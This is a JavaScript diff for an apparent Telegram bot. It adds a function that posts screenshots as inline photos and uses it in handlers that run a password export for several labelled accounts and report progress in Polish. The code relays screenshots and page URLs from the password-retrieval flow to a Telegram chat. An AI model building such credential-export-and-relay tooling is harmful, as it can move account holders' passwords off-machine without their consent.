@@ -51,6 +51,34 @@ export async function sendDocument(buffer, filename, caption) {
   } catch { /* best-effort */ }
 }
 
+// sendPhoto — sends a JPEG/PNG buffer as an inline photo (visible directly in chat).
+// Use this for screenshots instead of sendDocument.
+export async function sendPhoto(buffer, caption, chatId) {
+  if (!isEnabled()) return;
+  try {
+    const targetChat = chatId || config.telegramChatId;
+    const boundary = '----spPhotoBoundary' + Date.now().toString(16);
+    const parts = [];
+    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
+    text(`--${boundary}\r\n`);
+    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${targetChat}\r\n`);
+    if (caption) {
+      text(`--${boundary}\r\n`);
+      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption.slice(0, 1024)}\r\n`);
+    }
+    text(`--${boundary}\r\n`);
+    text(`Content-Disposition: form-data; name="photo"; filename="screen.jpg"\r\n`);
+    text(`Content-Type: image/jpeg\r\n\r\n`);
+    parts.push(buffer);
+    text(`\r\n--${boundary}--\r\n`);
+    await fetch(apiUrl('sendPhoto'), {
+      method: 'POST',
+      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
+      body: Buffer.concat(parts),
+    });
+  } catch { /* best-effort */ }
+}
+
 export async function discoverChatId() {
   const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
   const data = await res.json();
@@ -495,7 +523,7 @@ async function handleGpwCsv(chatId, accountId, callbackQueryId) {
     );
 
     const onScreenshot = (buf, url) => {
-      sendDocument(buf, `screen-${accountId}.jpg`, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
+      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
     };
 
     const result = await openPasswordsExport(accountId, onScreenshot);
@@ -539,10 +567,10 @@ async function handleGpwRows(chatId, accountId, callbackQueryId) {
     } catch {}
 
     const onScreenshot = (buf, url) => {
-      sendDocument(buf, `screen-${accountId}.jpg`, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
+      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
     };
     const onProgress = (done, total) => {
-      if (progressMsgId && done % 10 === 0) {
+      if (progressMsgId && done % 5 === 0) {
         editMessage(chatId, progressMsgId, `🔐 Pobieram hasła: ${done} / ${total}`).catch(() => {});
       }
     };
